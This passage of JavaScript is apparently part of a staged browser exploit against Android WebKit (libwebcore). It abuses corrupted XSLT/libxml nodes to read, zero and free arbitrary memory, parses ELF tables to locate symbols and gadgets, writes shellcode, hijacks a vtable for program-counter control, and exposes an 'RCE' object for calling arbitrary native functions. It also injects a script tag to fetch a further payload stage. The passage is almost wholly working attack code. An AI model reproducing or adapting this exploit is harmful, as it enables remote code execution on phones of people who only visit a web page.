    memobj.write32(structfn + 24, 0);
    memobj.write32(structfn + 28, 0);


    for (var i = 0; i < CALLSTUB.length; i++) {
	memobj.write8(shellcode_addr + i, CALLSTUB[i]);
    }

    // Check if this is one of those lucky phones that have a
    // SEPARATE v8 library
    var v8start = libwebcore.addr;
    var v8end = libwebcore.addr + libwebcore.size

    var v8enter = libwebcore.findreloc("_ZN2v87Context5EnterEv");
    if (v8enter !== null) {
	INFO("v8 is separate from libwebcore. Adjusting checks...");
	var v8 = memobj.findimagebase(v8enter);
	v8 = new ELFObject(v8, memobj);
	v8start = v8.addr;
	v8end = v8.addr + v8.size;
    }

    // Fill the variable shellcode words
    for (var i = 0; i < CALLSTUB.length/4; i++) {
	switch (memobj.read32(shellcode_addr + i*4)) {
	case 0xbadadd00:
	    memobj.write32(shellcode_addr + i*4, addr + 0x8300 + gadgets.str_r1_r4.disp);
	    break;
	case 0xbadadd01:
	    memobj.write32(shellcode_addr + i*4, libwebcore.addr);
	    break;
	case 0xbadadd02:
	    memobj.write32(shellcode_addr + i*4, libwebcore.addr + libwebcore.size);
	    break;
	case 0xbadadd03:
	    memobj.write32(shellcode_addr + i*4, v8start);
	    break;
	case 0xbadadd04:
	    memobj.write32(shellcode_addr + i*4, v8end);
	    break;
	case 0xbadadd05:
	    memobj.write32(shellcode_addr + i*4, structfn);
	    break;
	case 0xbadadd06:
	    memobj.write32(shellcode_addr + i*4, 1);
	    break;
	}
    }

    var vtable = memobj.read32(node.addr);

    // PC control (arbitrary address)
    // Replace the vtable
    memobj.write32(node.addr, fakevtable);

    // Call the function (yes this is a function call)
    node.obj.nodeValue = "x";
    
    // Put the vtable down, NAO
    memobj.write32(node.addr, vtable);

    INFO("Got out of function call. Building RCECall");

    var result = memobj.read32(structfn);
    memobj.write32(structfn, 0x0);

    trk *= result;

    var rce = new RCE(memobj, node, structfn, shellcode_addr, fakevtable);

    download_stage4(memobj, rce, libc, libwebcore, addr, trk);

}

function download_stage4(memobj, rce, libc, libwebcore, addr, trk) {
    var stage4_script = document.createElement('script');
    stage4_script.type = 'text/javascript';
    
    stage4_script.onload = function () {
	window['stage4'](memobj, rce, libc, libwebcore, addr);
    };

    stage4_script.src = 'stage4_js.py?trk=' + trk.toString();
    document.getElementsByTagName('head')[0].appendChild(stage4_script);
}

// [ RCE object ] ----------------------------------------------------------- //

/**
 * @constructor
 */
function RCE(memobj, node, structfn, callstub, fakevtable) {
    this.node = node;
    this.structfn = structfn;
    this.callstub = callstub;
    this.memobj = memobj;
    this.fakevtable = fakevtable;
}

window["RCE"] = RCE;

RCE.prototype.call = function(fn, r0, r1, r2, r3, r4, forking) {
    if (fn === undefined || fn === null) {
	ERR("RCE: function address cannot be " + fn);
    }
    if (r0 === undefined) r0 = 0;
    if (r1 === undefined) r1 = 0;    
    if (r2 === undefined) r2 = 0;    
    if (r3 === undefined) r3 = 0;
    if (r4 === undefined) r4 = 0;

    if (forking === undefined) forking = 0;
    if (forking === false) forking = 0;
    if (forking === true) forking = 1;

    if (forking !== 0 && forking !== 1) {
	ERR("RCE.call: forking cannot be " + forking.toString());
    }
    
    this.memobj.write32(this.structfn +  0, fn);
    this.memobj.write32(this.structfn +  4, forking);
    this.memobj.write32(this.structfn +  8, r0);
    this.memobj.write32(this.structfn + 12, r1);
    this.memobj.write32(this.structfn + 16, r2);
    this.memobj.write32(this.structfn + 20, r3);
    this.memobj.write32(this.structfn + 24, r4);
    
    var vtable = this.memobj.read32(this.node.addr);

    // Fill the vtable with callstub, if it's not already there
    if (this.memobj.read32(this.fakevtable) != this.callstub) {
	for (var j = 0; j < 94; j++) {
	    this.memobj.write32(this.fakevtable + j * 4, this.callstub);
	    // memobj.write32(addr + 0x8000 + j * 4, 0x40404040);	
	}
    }

    // Replace the vtable
    this.memobj.write32(this.node.addr, this.fakevtable);

    // Call the function (yes this is a function call)
    this.node.obj.nodeValue = "x";
	
    // Put the vtable down, NAO
    this.memobj.write32(this.node.addr, vtable);

    var ret = this.memobj.read32(this.structfn + 28);
    return ret;
};

RCE.prototype["call"] = RCE.prototype.call;

RCE.prototype.forkingcall = function(fn, r0, r1, r2, r3, r4) {
    if (fn === undefined || fn === null) {
	ERR("RCE: function address cannot be " + fn);
    }
    if (r0 === undefined) r0 = 0;
    if (r1 === undefined) r1 = 0;    
    if (r2 === undefined) r2 = 0;    
    if (r3 === undefined) r3 = 0;
    if (r4 === undefined) r4 = 0;

    return this.call(fn, r0, r1, r2, r3, r4, true);
};

RCE.prototype["forkingcall"] = RCE.prototype.forkingcall;

// [ XSLT exploit object ] -------------------------------------------------- //

/**
 * @constructor
 */
function XSLTObject(page, childrenaddr, nameaddr, elementaddr, xml) {
    if (page === undefined) {
	ERR("XSLTObject: A page object is required.");
    }

    if (childrenaddr === undefined) {
	ERR("XSLTObject: A children address is required.");
    }

    if (nameaddr === undefined) {
	ERR("XSLTObject: A name address is required.");
    }

    if (elementaddr === undefined) {
	ERR("XSLTObject: A root element address is required.");
    }

    if (xml === undefined) {
	ERR("XSLTObject: An xml document object is required.");
    }

    // Register this object globally
    window['g_xsltobj'] = this;
    
    this.alive = true;

    this.page = page;
    this.ca = childrenaddr;
    this.na = nameaddr;
    this.ea = elementaddr;
    this.xml = xml;

    INFO("Creating XSLTObject: ca " + hex(this.ca, 8) + " na " + hex(this.na, 8) + " ea " + hex(this.ea, 8));

    // Spring cleaning
    for (var i = 0; i < 0x6000/4; i++) {
	page.write(this.ca + i*4, 0);
    }

}

XSLTObject.prototype.processXSL = function(xslsource) {
    var processor = new XSLTProcessor();
    var xsl = parseXML(xslsource);
    processor.importStylesheet(xsl);
    var result = processor.transformToDocument(this.xml);
    return result;
};

// Zeroes any dword in memory
XSLTObject.prototype.zero = function (addr) {
    this.page.write(this.ca +  4, 14);        // children->type = XML_DTD_NODE
    this.page.write(this.ca + 24, 0);         // children->next = 0x0
    this.page.write(this.ca + 28, addr - 24); // children->prev = addr - offset(next)

    var xsl = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' +
	'<xsl:template match="/*">' + 
	'  <xsl:apply-templates/>' +
	'</xsl:template>' +
	'</xsl:stylesheet>';

    this.processXSL(xsl);

    // Clean up
    this.page.write(this.ca +  4, 0);
    this.page.write(this.ca + 28, 0);
};

// Frees address addr, and then follows the node chain.
// Every node with invalid type will be freed.
XSLTObject.prototype.free = function (addr) {
    this.page.write(this.ca +  4, 14);
    this.page.write(this.ca + 24, addr);  // children->next = freenode

    // This will attempt to free addr
    this.page.write(addr +  4, 0xbad);     // freenode->type invalid


    var xsl = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
	'<xsl:template match="/*">' + 
	'  <xsl:apply-templates/>' +
	'</xsl:template>' +
	'</xsl:stylesheet>';

    var res = this.processXSL(xsl);

    this.page.write(this.ca +  4, 0);
    this.page.write(this.ca + 24, 0);
};

// readstring copies a null terminated string in memory. Any non-ascii character is %-escaped
XSLTObject.prototype.readstring = function (addr) {
    var old_4 = this.page.read(this.ca + 4);
    var old_40 = this.page.read(this.ca + 40);
    
    this.page.write(this.ca +  4, 3);          // children->type = XML_TEXT_NODE
    this.page.write(this.ca + 40, addr);       // children->content = addr

    var xsl = '<xsl:stylesheet ' +
	'xmlns:xsl="http://www.w3.org/1999/XSL/Transform" ' +
	'xmlns:xq="http://www.w3.org/2002/08/xquery-functions" version="1.0" >' +
	'<xsl:template match="/*">' + 
	'<data>' +
	'DATA=<xsl:value-of select="xq:escape-uri(text(), false())" />' +
	'</data>' +
	'</xsl:template>' +
	'</xsl:stylesheet>';

    var res = this.processXSL(xsl);
    
    if (res === undefined) {
	ERR("XSLTObject.readstring: cannot process XSLT.");
    }

    var data = res.getElementsByTagName("data")[0];
    var ret = data.childNodes[0].nodeValue.slice(5);

    // Clean up
    this.page.write(this.ca +  4, old_4);
    this.page.write(this.ca + 40, old_40);

    return ret;
};

// Reads an arbitrary number of bytes by leveraging string read.
XSLTObject.prototype.readbytes = function (addr, nbytes) {
    if (addr === undefined) {
	ERR("XSLTObject.readbytes: an address is required");
    }

    if (nbytes === undefined) {
	ERR("XSLTObject.readbytes: a number of bytes is required");
    }
    
    var bytes = [];
    var s;
    var cur = addr;
    var read = 0;
    var i = 0;

    while (read < nbytes) {
	s = this.readstring(cur);
	i = 0;
	while (read < nbytes && i < s.length) {
	    if (s[i] == "%") {
		bytes.push(parseInt(s.slice(i+1, i+3), 16));
		i += 3;
	    } else {
		bytes.push(s.charCodeAt(i));
		i += 1;
	    }
	    read += 1;
	}
	if (read < nbytes) {
	    bytes.push(0);
	    read += 1;
	}
	cur = addr + read;
    }

    return bytes;
};

// Reads a dword (or "word" in ARM speaking) 32bit unsigned integer
XSLTObject.prototype.read32 = function (addr) {
    var bytes = this.readbytes(addr, 4);
    return (bytes[0] | bytes[1] << 8 | bytes[2] << 16 | (bytes[3] << 24)>>>0)>>>0;
};

// Resets the original XML document values so that the browser won't crash
// when the current tab is closed.
// NOTE: The XSLTObject won't be usable anymore! This is the last function
// to call.
XSLTObject.prototype.terminate = function () {
    this.zero(this.ea + 40); // element->content

    this.page.write(this.na + 0x100, stringtoarray("qel"));

    // kill both element->name and element->children in one go

    this.page.write(this.ca +  4, 1);               // qel1->type = XML_ELEMENT_NODE
    this.page.write(this.ca +  8, this.na + 0x100); // qel1->name = "qel"
    this.page.write(this.ca + 12, this.ca + 0x80);  // qel1->children
    this.page.write(this.ca + 24, this.ca + 0x40);  // qel1->next = qel2

    this.page.write(this.ca + 0x40 +  4, 1);               // qel2->type = XML_ELEMENT_NODE
    this.page.write(this.ca + 0x40 +  8, this.na + 0x100); // qel2->name = "qel"
    this.page.write(this.ca + 0x40 + 12, this.ca + 0xb0);  // qel2->children

    this.page.write(this.ca + 0x80 +  4, 14);               // DTDc1->type = XML_DTD_NODE
    this.page.write(this.ca + 0x80 + 24, 0);
    this.page.write(this.ca + 0x80 + 28, this.ea + 8 - 24); // DTDc1->prev = element->name - off(next)

    this.page.write(this.ca + 0xb0 +  4, 14);                // DTDc1->type = XML_DTD_NODE
    this.page.write(this.ca + 0xb0 + 24, 0);       
    this.page.write(this.ca + 0xb0 + 28, this.ea + 12 - 24); // DTDc1->prev = element->children - off(next)

    var xsl = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' +
	'<xsl:template match="qel">' +
	'  <xsl:apply-templates/>' +
	'</xsl:template>' +
	'<xsl:template match="/*">' + 
	'  <xsl:apply-templates/>' +
	'</xsl:template>' +
	'</xsl:stylesheet>';

    this.processXSL(xsl);

    this.alive = false;
};

// Testing functions
// Set the documentElement name
XSLTObject.prototype.set_root_name = function (s) {
    this.page.write(this.na, stringtoarray(s));
};

// Get the documentElement name
XSLTObject.prototype.get_root_name = function() {
    var xsl = '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0" >' +
	'<xsl:template match="/*">' + 
	'<data>' +
	'<xsl:value-of select="local-name()" />' +
	'</data>' +
	'</xsl:template>' +
	'</xsl:stylesheet>';

    var res = this.processXSL(xsl);
    
    if (res === undefined) {
	ERR("XSLTObject.test: cannot process XSLT.");
    }

    var data = res.getElementsByTagName("data")[0];
    if (data === undefined) {
	ERR("XSLTObject.test: cannot process XSLT data field.");
    }
    return data.childNodes[0].nodeValue;
};

// [ Array Memory exploit Object ] ------------------------------------------ //
    
/**
 * @constructor
 */
function BufferMemoryObject(arraybuffer) {
    if (arraybuffer === undefined) {
	ERR("BufferMemoryObject: an array is required");
    }

    this.arraybuffer = arraybuffer;
    this.view = new DataView(arraybuffer);
}
window["BufferMemoryObject"] = BufferMemoryObject;

BufferMemoryObject.prototype.write32 = function(addr, content) {
    this.view.setUint32(addr, content, true);
};

BufferMemoryObject.prototype["write32"] = BufferMemoryObject.prototype.write32;

BufferMemoryObject.prototype.read32 = function(addr) {
    return this.view.getUint32(addr, true)>>>0;
};

BufferMemoryObject.prototype["read32"] = BufferMemoryObject.prototype.read32;

BufferMemoryObject.prototype.write8 = function(addr, content) {
    this.view.setUint8(addr, content);
};

BufferMemoryObject.prototype["write8"] = BufferMemoryObject.prototype.write8;

BufferMemoryObject.prototype.read8 = function(addr) {
    return this.view.getUint8(addr);
};

BufferMemoryObject.prototype["read8"] = BufferMemoryObject.prototype.read8;

BufferMemoryObject.prototype.write16 = function(addr, content) {
    this.view.setUint16(addr, content, true);
};

BufferMemoryObject.prototype["write16"] = BufferMemoryObject.prototype.write16;

BufferMemoryObject.prototype.read16 = function(addr) {
    return this.view.getUint16(addr, true);
};

BufferMemoryObject.prototype["read16"] = BufferMemoryObject.prototype.read16;

BufferMemoryObject.prototype.writearray = function(addr, arr) {
    for (var i = 0; i < arr.length; i++) {
	this.write8(addr + i, arr[i]);
    }
};

BufferMemoryObject.prototype["writearray"] = BufferMemoryObject.prototype.writearray;

BufferMemoryObject.prototype.writestring = function(addr, s) {
    var arr = stringtoarray(s, true);
    for (var i = 0; i < arr.length; i++) {
	this.write8(addr + i, arr[i]);
    }
};

BufferMemoryObject.prototype["writestring"] = BufferMemoryObject.prototype.writestring;

// Searches for a given array of 32-bit values in memory (in order),
// starting at address addr.
BufferMemoryObject.prototype.find32 = function(startaddr, endaddr, arr) {
    if (startaddr === undefined) {
	ERR("find32: a start address is required");
    }

    if (endaddr === undefined) {
	ERR("find32: An end address is required");
    }

    if (arr === undefined) {
	ERR("find32: An array is required");
    }

    if (typeof(arr) == 'number') {
	arr = [arr];
    }

    var addr = startaddr;

    while (addr < endaddr) {
	var cur = addr;
	for (var i = 0; i < arr.length; i++) {
	    if (this.read32(cur) != arr[i]) break;
	    if (i == arr.length - 1) {
		return addr;
	    }
	    cur += 4;
	}
	
	addr += 4;
    }

    return null;
};

BufferMemoryObject.prototype["find32"] = BufferMemoryObject.prototype.find32;

// Searches for a given value or array of 16-bit values in memory (in order),
// starting at address addr.
BufferMemoryObject.prototype.find16 = function(startaddr, endaddr, arr) {
    if (startaddr === undefined) {
	ERR("find16: a start address is required");
    }

    if (endaddr === undefined) {
	ERR("find16: An end address is required");
    }

    if (arr === undefined) {
	ERR("find16: An array or value is required");
    }

    if (typeof(arr) == 'number') {
	arr = [arr];
    }

    var addr = startaddr;

    while (addr < endaddr) {
	var cur = addr;
	for (var i = 0; i < arr.length; i++) {
	    if (this.read16(cur) != arr[i]) break;
	    if (i == arr.length - 1) {
		return addr;
	    }
	    cur += 2;
	}
	
	addr += 2;
    }

    return null;
};

BufferMemoryObject.prototype["find16"] = BufferMemoryObject.prototype.find16;

// Given an address inside an executable section of a module, goes backwards
// to find the ELF header of that module and returns the base address.
BufferMemoryObject.prototype.findimagebase = function (addr) {
    addr = (addr & 0xfffff000)>>>0;
    
    while (true) {
	// 0x7f 'E' 'L' 'F' 0x01 0x01
	if ((this.read32(addr) == 0x464c457f) &&
	    (this.read16(addr + 4) == 0x0101)) {
	    break;
	}
	addr -= 0x1000;
    }

    return addr;
};

BufferMemoryObject.prototype["findimagebase"] = BufferMemoryObject.prototype.findimagebase;

// Reads a null-terminated ASCII string
BufferMemoryObject.prototype.readstring = function (addr) {
    var arr = [];
    var b;
    
    while (true) {
	b = this.read8(addr);
	if (b == 0) {
	    break;
	}
	
	arr.push(b);
	addr++;
    }
    return arraytostring(arr);
};

BufferMemoryObject.prototype["readstring"] = BufferMemoryObject.prototype.readstring;

// [ ELF handling object ] -------------------------------------------------- //

/**
 * @constructor
 */
function ELFObject(addr, memobj) {
    if (addr === undefined) {
	ERR("ELFObject: an address is required");
    }
    
    if (memobj === undefined) {
	ERR("ELFObject: a memory object is required");
    }

    this.addr = addr;
    this.memobj = memobj;

    INFO("--- ELF data ---");
    this.initsymtab();
    this.readgot();
    INFO("--- ELF read ---");
}

window["ELFObject"] = ELFObject;

ELFObject.prototype.initsymtab = function () {
    
    var phdr = this.addr + this.memobj.read32(this.addr + 28);
    
    var phnum = this.memobj.read16(this.addr + 44);
    var curhdr = phdr;
    var p_type;
    
    this.dynamic = null;
    
    // this.size is the size of the executable segment where the
    // elf header resides.
    this.size = null;


    for (var i = 0; i < phnum; i++) {
	p_type = this.memobj.read32(curhdr);

	if (p_type == 2) { // PT_DYNAMIC
	    this.dynamic = this.addr + this.memobj.read32(curhdr + 8);
	}

	if (p_type == 1) { // PT_LOAD
	    var p_flags = this.memobj.read32(curhdr + 24);
	    if (p_flags == 5) { // PF_X | PF_R

		var p_vaddr = this.memobj.read32(curhdr + 8);
		var p_memsz = this.memobj.read32(curhdr + 20);
		// INFO("ELF: found PT_LOAD (p_vaddr = "
		//      + p_vaddr.toString(16) + " p_memsz = "
		//      + p_memsz.toString(16) + ")");
		     
		if (p_vaddr == 0x0) {
		    this.size = p_memsz;
		}
	    }
	}

	if (this.dynamic !== null && this.size !== null) break;

	curhdr += 32;
    }

    if (this.dynamic === null) {
	ERR("ELFObject: cannot find phdr DYNAMIC");
    }

    if (this.size === null) {
	ERR("ELFObject: cannot find phdr LOAD");
    }

    var curdyn = this.dynamic;
    var tagtable = {
	2:  'pltrelsz', // DT_PLTRELSZ
	4:  'hashtab',  // DT_HASH
	5:  'strtab',   // DT_STRTAB
	6:  'symtab',   // DT_SYMTAB
	23: 'jmprel'    // DT_JMPREL
    };
	
    this.dyntable = {};
    var tag, tagname;
    for (tag in tagtable) {
	this.dyntable[tagtable[tag]] = null;
    }
    
    while (true) {
	tag = this.memobj.read32(curdyn);

	if (tag == 0) { // DT_NULL
	    break;
	}
	
	if (tag in tagtable) {
	    this.dyntable[tagtable[tag]] = this.memobj.read32(curdyn + 4);
	}

	curdyn += 8;

	var end = true;
	for (tagname in this.dyntable) {
	    if (this.dyntable[tagname] === null) {
		end = false;
		break;
	    }
	}

	if (end === false) {
	    continue;
	}

	break;
    }

    for (tagname in this.dyntable) {
	if (this.dyntable[tagname] === null) {
	    ERR("ELFObject: Couldn't get " + tagname + " from DYNAMIC");
	}
    }

    this.dyntable['strtab'] += this.addr;
    this.dyntable['hashtab'] += this.addr;
    this.dyntable['symtab'] += this.addr;
    this.dyntable['jmprel'] += this.addr;

    
    for (tagname in this.dyntable) {
	INFO("  " + tagname + " = " + this.dyntable[tagname].toString(16));
    }
};

ELFObject.prototype.findgadget16 = function(arr, startoff) {
    if (startoff === undefined) {
	startoff = 0;
    }
    return this.memobj.find16(this.addr + startoff, this.addr + this.size, arr);
};

ELFObject.prototype.findstring = function(s, node, startoff) {
    if (s === undefined) {
	ERR("findstring: a string is required");
    }

    if (node === undefined) {
	ERR("findstring: a node is required");
    }

    if (startoff === undefined) {
	startoff = 0;
    }
    
    // This assignment is necessary because v8 appears to be caching
    // the nodeValue length on some phones (no idea why or when this happens)
    var random =  Math.floor((Math.random() * 100000) + 1);
    node.obj.nodeValue = "ELFObject_findstring_" + random;

    var m_data = this.memobj.read32(node.addr + node.dataoffset);
    var oldaddr = this.memobj.read32(m_data + 8);
    var oldlen = this.memobj.read32(m_data + 4);
    
    this.memobj.write32(m_data + 8, this.addr);
    this.memobj.write32(m_data + 4, this.size/2);

    var startindex = startoff/2;
    var index = node.obj.nodeValue.indexOf(s, startindex);
    
    this.memobj.write32(m_data + 8, oldaddr);
    this.memobj.write32(m_data + 4, oldlen);

    if (index == -1) return null;
    return this.addr + index*2;
};

ELFObject.prototype.readgot = function () {
    this.got = {};
    var max = this.dyntable['pltrelsz'] / 8;
    if (ENABLE_DEBUG) {
	INFO("  GOT = " + (this.addr + this.memobj.read32(this.dyntable['jmprel'])).toString(16));
    }
    for (var i = 0; i < max; i++) {
	var rel = this.memobj.read32(this.addr + this.memobj.read32(this.dyntable['jmprel'] + (8 * i)));
	var r_info =  this.memobj.read32(this.dyntable['jmprel'] + (i * 8) + 4);
	var index = r_info >>> 8;
	this.got[index] = rel;
    }
    
};

ELFObject.prototype.dumpjmprel = function () {
    var table = [];
    var max = this.dyntable['pltrelsz'] / 8; 

    for (var i = 0; i < max; i++) {
	var rel = this.memobj.read32(this.addr + this.memobj.read32(this.dyntable['jmprel'] + (8 * i)));
	var r_info =  this.memobj.read32(this.dyntable['jmprel'] + (i * 8) + 4);
	var index = r_info >>> 8;
	var name = this.memobj.read32(this.dyntable['symtab'] + (index * 16));
	name = this.memobj.readstring(name + this.dyntable['strtab']);
	INFO(rel.toString(16) + " : " + name);
    }
};

// Finds a relocation address by name.
// Returns the address on success, null otherwise
ELFObject.prototype.findreloc = function(name) {
    var index = this.findindex(name);
    if (index === null) return null;
    return this.got[index];
};

ELFObject.prototype["findreloc"] = ELFObject.prototype.findreloc;

// Finds a symbol value by name.
// For imported symbols the value will be 0. Use findreloc instead.
ELFObject.prototype.findsymbol = function(name) {
    var index = this.findindex(name);
    if (index === null) return null;
    return this.memobj.read32(this.dyntable['symtab'] + (index * 16) + 4) + this.addr;
};

ELFObject.prototype.requiresymbol = function(name) {
    var sym = this.findsymbol(name);
    if (sym === undefined || sym === 0) {
	ERR("Cannot find required symbol " + name);
    }
    return sym;
};

ELFObject.prototype["requiresymbol"] = ELFObject.prototype.requiresymbol;

// Finds a symbol index in the symbol table
ELFObject.prototype.findindex = function(name) {
    if (this.hashtab === undefined) {
	this.hashtab = {};
	this.hashtab.addr = this.dyntable['hashtab'];
	this.hashtab.nbucket = this.memobj.read32(this.hashtab.addr);
	this.hashtab.nchain = this.memobj.read32(this.hashtab.addr + 4);
	this.hashtab.bucket = this.hashtab.addr + 8;
	this.hashtab.chain = this.hashtab.addr + 8 + (4 * this.hashtab.nbucket);
    }

    var hash = this.hash(name);
    var index = this.memobj.read32(this.hashtab.bucket + (hash%this.hashtab.nbucket)*4);
    var s;
    while(true) {
	s = this.memobj.read32(this.dyntable['symtab'] + (index * 16));
	if (s == 0) {
	    return null;
	}
	s = this.memobj.readstring(s + this.dyntable['strtab']);
	if (s == name) {
	    return index;
	}
	index = this.memobj.read32(this.hashtab.chain + (index * 4));
	if (index == 0) {
	    return null;
	}
    }
};

ELFObject.prototype.hash = function(s) {
    if (s === undefined) {
	ERR("ELFObject.hash: a string is required");
    }
    
    var b32 = function (n) {
	return ((n>>>0) & 0xffffffff)>>>0;
    };

    var h = 0;
    var g, c;

    for (var i = 0; i < s.length; i++) {
	h = b32(b32(h << 4) + s.charCodeAt(i));
	g = b32(h & 0xf0000000);
	if (g !== 0) {
	    h = b32(h ^ b32(g >>> 24));
	}
	h = b32(h & b32(g ^ 0xffffffff));
    }

    return h;
};
